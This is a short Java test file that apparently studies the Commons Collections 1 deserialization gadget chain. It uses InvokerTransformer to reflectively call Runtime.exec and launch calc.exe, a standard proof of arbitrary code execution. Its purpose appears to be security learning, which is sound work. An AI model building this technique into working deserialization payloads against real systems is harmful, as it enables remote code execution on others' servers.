package Clown_CC1;

import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerTest {
    public static void main(String[] args) {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"C:\\Windows\\System32\\calc.exe"});
        invokerTransformer.transform(Runtime.getRuntime());
    }
}